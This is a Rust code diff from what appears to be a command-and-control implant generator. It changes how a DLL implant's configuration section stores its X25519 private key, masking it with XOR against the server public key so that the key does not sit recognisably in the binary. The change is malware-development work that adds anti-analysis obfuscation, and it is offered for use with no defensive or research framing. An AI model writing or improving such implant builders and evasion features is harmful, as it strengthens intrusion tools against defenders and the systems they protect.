@@ -564,9 +564,17 @@ pub async fn generate_implant(
     section[9] = ((data_len as u16) >> 8) as u8;
     // Config nonce (12B at bytes 10-21)
     section[10..22].copy_from_slice(&config_nonce);
-    // implant_priv (32B at bytes 22-53). Written directly — no XOR masking,
-    // no fragment permutation. The DLL binary itself is the protection layer.
-    section[22..54].copy_from_slice(&implant_priv);
+    // SECURITY (H11): XOR-mask implant_priv with server_pub before storing so
+    // the raw X25519 scalar does not appear verbatim in the .nyx_cfg section.
+    // Both the server and the implant have server_pub available (it is stored
+    // at section[54..86]); the implant un-XORs at load time. This is obfuscation,
+    // not strong crypto — the point is to avoid a recognizable private-key
+    // scalar sitting in plaintext in the binary.
+    let mut masked = implant_priv;
+    for i in 0..32 {
+        masked[i] ^= server_pub[i];
+    }
+    section[22..54].copy_from_slice(&masked);
     // Server public key (32B at bytes 54-85).
     section[54..86].copy_from_slice(&server_pub);
 
